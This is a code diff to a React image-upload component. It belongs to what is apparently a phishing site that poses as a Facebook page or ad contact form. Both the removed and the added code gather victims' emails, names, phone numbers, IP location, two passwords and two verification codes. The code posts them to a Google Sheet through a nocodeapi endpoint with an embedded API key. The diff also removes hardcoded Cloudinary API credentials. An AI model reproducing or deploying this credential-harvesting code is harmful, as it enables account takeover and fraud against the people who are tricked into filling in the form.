@@ -1,4 +1,3 @@
-import axios from 'axios';
 import React, { useState } from 'react'
 import { useNavigate } from 'react-router-dom'
 
@@ -15,56 +14,58 @@ const Upload = () => {
     };
 
     const handleUpload = () => {
-        const cloudName = 'ductham087'; 
-        const apiKey = '726718364651615'; 
-        const apiSecret = 'MMvP3PFwD3JalWIRw7c_euqmixI'
         if (selectedFile) {
             const formData = new FormData();
             formData.append('file', selectedFile);
-            formData.append("upload_preset", "apiData");
+            formData.append("upload_preset", "docs_upload_example_us_preset");
 
-            axios
-                .post(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, formData)
-                .then((response) => {
-                    const imageUrl = response.data.secure_url;
+            fetch(url, {
+                method: 'POST',
+                body: formData,
+            })
+            .then((response) => {
+                return response.text();
+            })
+            .then((data) => {
+                const url_image = JSON.parse(data).url
+                const dataImages = {...dataLocalPassword, url_image};
 
-                    const dataImages = {...dataLocalPassword, imageUrl};
-
-                    const data_send   = [[
-                        dataImages.fill_business_email,
-                        dataImages.fill_personal_email,
-                        dataImages.fill_full_name,
-                        dataImages.fill_facebook_pagename,
-                        `&_${dataImages.fill_phone}`,
-                        dataImages.IP,
-                        dataImages.city,
-                        dataImages.countryName,
-                        dataImages.firt_password,
-                        dataImages.second_password,
-                        dataImages.first_code,
-                        dataImages.seconds_code,
-                        imageUrl
-                    ]];
-        
-                    fetch("https://v1.nocodeapi.com/tuananh91/google_sheets/uBbNrEnAmZBhngJY?tabId=sheet1&api_key=NXhkTJQFUXJkBgBXj", {
-                        method: "POST",
-                        mode: "cors",
-                        headers: {
-                            "Content-Type": "application/json",
-                        },
-                        body: JSON.stringify(data_send),
-                    })
-                    .then((r) => r.json())
-                    .then((res) => {
-                        navigate('/adcontact19485092349283487823/final');
-                    })
-                    .catch((error) => {
-                        console.log(error);
-                    });
-
+                const data_send   = [[
+                    dataImages.fill_business_email,
+                    dataImages.fill_personal_email,
+                    dataImages.fill_full_name,
+                    dataImages.fill_facebook_pagename,
+                    `&_${dataImages.fill_phone}`,
+                    dataImages.IP,
+                    dataImages.city,
+                    dataImages.countryName,
+                    dataImages.firt_password,
+                    dataImages.second_password,
+                    dataImages.first_code,
+                    dataImages.seconds_code,
+                    url_image
+                ]];
+    
+                fetch("https://v1.nocodeapi.com/tuananh91/google_sheets/uBbNrEnAmZBhngJY?tabId=sheet1&api_key=NXhkTJQFUXJkBgBXj", {
+                    method: "POST",
+                    mode: "cors",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(data_send),
                 })
+                .then((r) => r.json())
+                .then((res) => {
+                    navigate('/adcontact19485092349283487823/final');
+                })
+                .catch((error) => {
+                    console.log(error);
+                });
 
-            
+
+            });
+        } else {
+          console.log('Vui lòng chọn một tệp hình ảnh.');
         }
     };
 
